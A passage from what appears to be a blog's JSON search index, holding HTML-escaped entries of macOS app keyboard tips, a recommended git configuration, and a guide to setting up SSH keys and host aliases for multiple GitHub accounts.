navigate to \u003ccode\u003e/System/Library/CoreServices/Finder.app/Contents/Applications\u003c/code\u003e in Finder and drag the AirDrop icon to the Dock.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"spotlight\"\u003eSpotlight\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⌘B to search the web for the current query.\u003c/li\u003e\n\u003cli\u003ePress ⌘C to copy the full path to the selected file, or to copy the result of the current calculation.\u003c/li\u003e\n\u003cli\u003ePress ⌘D to open the Dictionary app with the current query.\u003c/li\u003e\n\u003cli\u003ePress ⌘L to jump to the dictionary section in the results (if present).\u003c/li\u003e\n\u003cli\u003ePress ⌘⏎ or ⌘R to reveal the selected file in Finder.\u003c/li\u003e\n\u003cli\u003eUse the \u003ccode\u003ename:\u003c/code\u003e filter to only search in the filename.\u003c/li\u003e\n\u003cli\u003eAdd \u003ccode\u003ekind:folder\u003c/code\u003e to only search for folder names.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e to show the path to the currently selected file.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"safari\"\u003eSafari\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eTab groups organize tabs spatially. Use ⌥⌘{↑,↓,←,→} to navigate tabs in 2D space.\u003c/li\u003e\n\u003cli\u003eWhen a video is playing, right click the speaker icon in the address bar or tab to enter Picture-in-Picture (PiP) mode.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while closing a tab to close all other tabs \u003cem\u003eexcept\u003c/em\u003e the current tab.\u003c/li\u003e\n\u003cli\u003eClick and hold the back button to see recent browsing history. Hold \u003ccode\u003eOption\u003c/code\u003e to see page URLs instead of page titles.\u003c/li\u003e\n\u003cli\u003eDrag selected text onto the Safari dock icon to quickly search the web for that text.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘T to re-open the most recently closed tab or window.\u003c/li\u003e\n\u003cli\u003eClick and hold on the new tab icon in the toolbar to view recently closed tabs.\u003c/li\u003e\n\u003cli\u003ePress the Space bar at the beginning of the address bar to change the search engine and to see recent web searches.\u003c/li\u003e\n\u003cli\u003eAdd \u003ccode\u003ekind:bookmark\u003c/code\u003e to Spotlight searches to search Safari bookmarks and browsing history.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eShift\u003c/code\u003e-click a link to add it to Reading List.\u003c/li\u003e\n\u003cli\u003eClick and hold a bookmark in the bookmarks bar to edit its display title.\u003c/li\u003e\n\u003cli\u003eOption-click the reload icon or press ⌥⌘R to force a fresh reload of the current webpage.\u003c/li\u003e\n\u003cli\u003eRight-click the reader icon in the address bar to automatically turn on Reader Mode for all pages on the current website.\u003c/li\u003e\n\u003cli\u003eAfter performing a web search and opening a result in the same tab, press ⌥⌘S to go back to the search results page.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘I to create a new email message with the contents of the current page.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e over the History \u0026gt; Clear History menu item to only clear browsing history while preserving website data.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘D while hovering over a link to open an inline preview of the link.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"mail\"\u003eMail\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eCommand\u003c/code\u003e-click multiple mailboxes in the left sidebar to simultaneously view all messages from the selected mailboxes.\u003c/li\u003e\n\u003cli\u003eSelect part of a message\u0026rsquo;s text before replying or forwarding to only include the selected text in the new message.\u003c/li\u003e\n\u003cli\u003eDrag a file to the Mail dock icon to compose a new message with the file already attached.\u003c/li\u003e\n\u003cli\u003ePress ⌥⇧⌘N to create a new tab.\u003c/li\u003e\n\u003cli\u003ePress the Space bar at the end of a message to go to the next message. Hold \u003ccode\u003eShift\u003c/code\u003e while pressing the Space bar at the top of a message to go to the previous message.\u003c/li\u003e\n\u003cli\u003eStart typing the first few characters of the sender, subject, or body to jump to that message in the messages list.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘↑ and ⌥⌘↓ to jump to the top-most or bottom-most message in the messages list.\u003c/li\u003e\n\u003cli\u003eSave an extra copy of an important message by dragging it to the Finder.\u003c/li\u003e\n\u003cli\u003eIf a message bounces, use \u003ccode\u003eMessage \u0026gt; Send Again\u003c/code\u003e on the bounced message to re-send it to a different address.\u003c/li\u003e\n\u003cli\u003eTo add a message to multiple folders, hold Command while dragging the message to each folder.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘C to assign a color to a message.\u003c/li\u003e\n\u003cli\u003eDrag a message into the Notes or Reminders app to add a link to the message.\u003c/li\u003e\n\u003cli\u003ePress ⌘R and ⇧⌘R while replying to a message to switch between reply and reply-all.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌫ to delete a message without automatically opening the next message.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCommand\u003c/code\u003e-click on the currently selected message to unselect it.\u003c/li\u003e\n\u003cli\u003eIf a message has already been replied to, click on the reply icon in the message list to open the reply in a new window.\u003c/li\u003e\n\u003cli\u003eWhen creating a new mailbox, add a forward slash to create a nested mailbox.\u003c/li\u003e\n\u003cli\u003eAfter performing a search, select a mailbox from the left sidebar to filter the search to that mailbox.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eShift\u003c/code\u003e while launching Mail to reset the index.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"preview\"\u003ePreview\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ` to bring up a magnifier, and then press \u003ccode\u003e+\u003c/code\u003e and \u003ccode\u003e-\u003c/code\u003e to resize it.\u003c/li\u003e\n\u003cli\u003eIn a PDF document, re-order the pages in the document by re-ordering the pages in the sidebar.\u003c/li\u003e\n\u003cli\u003eMerge two PDF documents by dragging pages from one document\u0026rsquo;s sidebar to the other document\u0026rsquo;s sidebar.\u003c/li\u003e\n\u003cli\u003eIn the save dialog for an image, hold \u003ccode\u003eOption\u003c/code\u003e while opening the Format menu to access an extended list of formats.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e and the Space bar to activate the pan tool.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while in text selection mode to switch to rectangular text selection.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"calendar\"\u003eCalendar\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eHold \u003ccode\u003eShift\u003c/code\u003e while dragging an event to set a more precise time instead of snapping to 15-minute intervals.\u003c/li\u003e\n\u003cli\u003eClick and hold the \u003ccode\u003eAccept\u003c/code\u003e button in a calendar invite to change which calendar the event is accepted to.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while pressing the \u003ccode\u003eAccept\u003c/code\u003e button in a calendar invite to accept all events.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while clicking any calendar\u0026rsquo;s checkbox in the left sidebar to show or hide all calendars.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e and \u003ccode\u003eOption\u003c/code\u003e while clicking a calendar\u0026rsquo;s checkbox to only show that calendar.\u003c/li\u003e\n\u003cli\u003eAdd \u003ccode\u003ekind:event\u003c/code\u003e to Spotlight searches to search calendar events.\u003c/li\u003e\n\u003cli\u003eResize the mini-calendar in the bottom-left to preview more months.\u003c/li\u003e\n\u003cli\u003eWith an event selected, press ⌃⌥↑ and ⌃⌥↓ to adjust the time of the event. This also works with multiple events selected.\u003c/li\u003e\n\u003cli\u003eIn Week view, press ⌥⌘← and ⌥⌘→ to shift the view by a single day.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"messages\"\u003eMessages\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⌘R to directly reply to the latest message in the conversation.\nPress ⇧⌘R to reply to the latest thread in the conversation.\u003c/li\u003e\n\u003cli\u003ePress ⌘T to bring up the tapback selector for the latest message. Use the 1-6 number keys to select a reaction.\u003c/li\u003e\n\u003cli\u003ePress ⌘E to edit the latest sent message.\u003c/li\u003e\n\u003cli\u003ePress ⌥↑ and ⌥↓ in the message input field to cycle through previously sent messages.\u003c/li\u003e\n\u003cli\u003ePress ⌘1-9 to jump to a pinned conversation.\u003c/li\u003e\n\u003cli\u003eRight-click on a message and select Show Times to view exact timestamps for each message.\u003c/li\u003e\n\u003cli\u003eRight-click the Messages icon in the Dock to quickly view and jump to unread conversations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"photos\"\u003ePhotos\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eDrag an item to the \u0026ldquo;My Albums\u0026rdquo; header section to quickly create an album with that item.\u003c/li\u003e\n\u003cli\u003eAfter adding an item to an album, use ⌃⌘A to add other items to that same album.\u003c/li\u003e\n\u003cli\u003eWhen editing an image, hold down the \u003ccode\u003eM\u003c/code\u003e key to compare the modifications to the original.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while launching Photos to choose a different photo library to open.\u003c/li\u003e\n\u003cli\u003eDrag a photo from the Photos app into a Finder window to quickly export the photo, or into the Mail or Messages app to attach the photo.\u003c/li\u003e\n\u003cli\u003eWhen editing an image, double-click an adjustment slider to reset it.\u003c/li\u003e\n\u003cli\u003eWhen editing an image, hold \u003ccode\u003eOption\u003c/code\u003e while holding the pointer over an adjustment slider to extend the adjustment range.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while clicking the rotate button to reverse the rotation direction.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eShift\u003c/code\u003e while cropping a photo to maintain the current aspect ratio, and hold \u003ccode\u003eOption\u003c/code\u003e to crop from the center of the photo.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"textedit\"\u003eTextEdit\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eIn rich text mode, press \u003ccode\u003eOption-Tab\u003c/code\u003e to insert an outlined list.\u003c/li\u003e\n\u003cli\u003ePress \u003ccode\u003eOption-Escape\u003c/code\u003e to autocomplete the current word.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌥⌘P in the find text field (⌘F) to access special search tokens.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while selecting text to make vertical text selections.\u003c/li\u003e\n\u003cli\u003eThe select line dialog (⌘L) supports the following formats:\n\u003ccode\u003e1-3\u003c/code\u003e selects lines 1-3 in the document\n\u003ccode\u003e+2\u003c/code\u003e selects the 2nd line below the cursor\n\u003ccode\u003e-2\u003c/code\u003e selects the 2nd line above the cursor\n\u003ccode\u003e+2-4\u003c/code\u003e selects 3 lines, starting from 2 lines below the cursor\n\u003ccode\u003e-2-4\u003c/code\u003e selects 3 lines, starting from 2 lines above the cursor\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"terminal\"\u003eTerminal\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⇧⌘A to select the output from the previous command.\u003c/li\u003e\n\u003cli\u003ePress ⌘L to clear the output from the previous command.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘V to paste and format text that is properly escaped for the shell.\u003c/li\u003e\n\u003cli\u003ePress ⌃T while a command is executing to view runtime statistics about the execution so far.\u003c/li\u003e\n\u003cli\u003ePress ⌘{↑,↓} to select the previous/next commands. Then press ⇧⌘A to select the output of the currently selected command.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘I to set a title for the current window and tab.\u003c/li\u003e\n\u003cli\u003eDrag a file or folder into a Terminal window to insert its full path. Alternatively, copy a file or folder in Finder and paste it in Terminal to insert its path.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"calculator\"\u003eCalculator\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⌘T to open a new window that keeps a running history of calculations.\u003c/li\u003e\n\u003cli\u003ePress ⌘R to enable Reverse Polish notation (RPN) mode.\u003c/li\u003e\n\u003cli\u003ePress \u003ccode\u003ep\u003c/code\u003e to insert pi.\u003c/li\u003e\n\u003cli\u003eRight-click the number display and select \u0026ldquo;Large Type\u0026rdquo; to view the current result in a large overlay window.\u003c/li\u003e\n\u003cli\u003eUse the Convert menu to perform various unit conversions.\u003c/li\u003e\n\u003cli\u003eIn Programmer view (⌘3), click the individual binary bits to toggle between 0 and 1.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"quicktime-player\"\u003eQuickTime Player\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eGrab a single frame from a video by pausing on the desired frame (using the Left and Right arrow keys to navigate individual frames) and pressing ⌘C.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"photo-booth\"\u003ePhoto Booth\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while taking a picture to skip the countdown.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eShift\u003c/code\u003e while taking a picture to disable the screen flash.\u003c/li\u003e\n\u003cli\u003eWhen choosing one of the distortion effects (on the third page), click and drag the cursor on the image preview to change the effects origin.\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","macOS"],"title":"macOS Tips \u0026 Tricks"},{"categories":["URL","git"],"contents":" How Core Git Developers Configure Git # clearly makes git better [column] ui = auto [branch] sort = -committerdate [tag] sort = version:refname [init] defaultBranch = main [diff] algorithm = histogram colorMoved = plain mnemonicPrefix = true renames = true [push] default = simple autoSetupRemote = true followTags = true [fetch] prune = true pruneTags = true all = true # why the hell not? [help] autocorrect = prompt [commit] verbose = true [rerere] enabled = true autoupdate = true [core] excludesfile = ~/.gitignore [rebase] autoSquash = true autoStash = true updateRefs = true # a matter of taste (uncomment if you dare) [core] # fsmonitor = true # untrackedCache = true [merge] # (just \u0026#39;diff3\u0026#39; if git version \u0026lt; 2.3) # conflictstyle = zdiff3 [pull] # rebase = true ","date":"March 7, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250307-how-git-core-devs-configure-git/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.gitbutler.com/how-git-core-devs-configure-git/\" target=\"_blank\" rel=\"noopener\"\u003eHow Core Git Developers Configure Git\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# clearly makes git better\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecolumn\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ui \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e auto\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ebranch\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        sort \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e -committerdate\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003etag\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        sort \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e version:refname\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003einit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        defaultBranch \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ediff\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        algorithm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e histogram\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        colorMoved \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e plain\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        mnemonicPrefix \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        renames \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003epush\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        default \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e simple\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autoSetupRemote \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        followTags \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003efetch\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        prune \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        pruneTags \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        all \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# why the hell not?\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ehelp\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autocorrect \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e prompt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecommit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        verbose \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ererere\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        enabled \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autoupdate \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecore\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        excludesfile \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ~/.gitignore\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003erebase\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autoSquash \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autoStash \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        updateRefs \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# a matter of taste (uncomment if you dare)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecore\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# fsmonitor = true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# untrackedCache = true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003emerge\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# (just \u0026#39;diff3\u0026#39; if git version \u0026lt; 2.3)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# conflictstyle = zdiff3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003epull\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# rebase = true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","git"],"title":"How Core Git Developers Configure Git"},{"categories":["URL","command line","ssh","Github"],"contents":" Configuring SSH Keys for Multiple GitHub Accounts Use Different Host values Host github.com HostName github.com User git IdentityFile ~/.ssh/id_fry_ed25519 Host github-plnx HostName github.com User git IdentityFile ~/.ssh/id_fry_plnx_ed25519 # Instead of the actual URL $ git clone git@github.com:planet-express/delivery_service.git # Substitue in our custom Host value for the `github.com` part $ git clone git@github-plnx:planet-express/delivery_service.git Automate Substituting the Host [include] path = ~/.gitconfig_custom # See custom `Host github-plnx` in ~/.ssh/config [url \u0026#34;github-plnx:planet-express\u0026#34;] insteadOf = git@github.com:planet-express ","date":"February 11, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250211-configure-ssh-keys-for-multiple-github-accounts/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stevenharman.net/configure-ssh-keys-for-multiple-github-accounts\" target=\"_blank\" rel=\"noopener\"\u003eConfiguring SSH Keys for Multiple GitHub Accounts\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"use-different-host-values\"\u003eUse Different Host values\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  HostName github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  User git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  IdentityFile ~/.ssh/id_fry_ed25519\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost github-plnx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  HostName github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  User git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  IdentityFile ~/.ssh/id_fry_plnx_ed25519\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Instead of the actual URL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ git clone git@github.com:planet-express/delivery_service.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Substitue in our custom Host value for the `github.com` part\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ git clone git@github-plnx:planet-express/delivery_service.git\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"automate-substituting-the-host\"\u003eAutomate Substituting the Host\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003einclude\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ~/.gitconfig_custom\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# See custom `Host github-plnx` in ~/.ssh/config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eurl \u003cspan 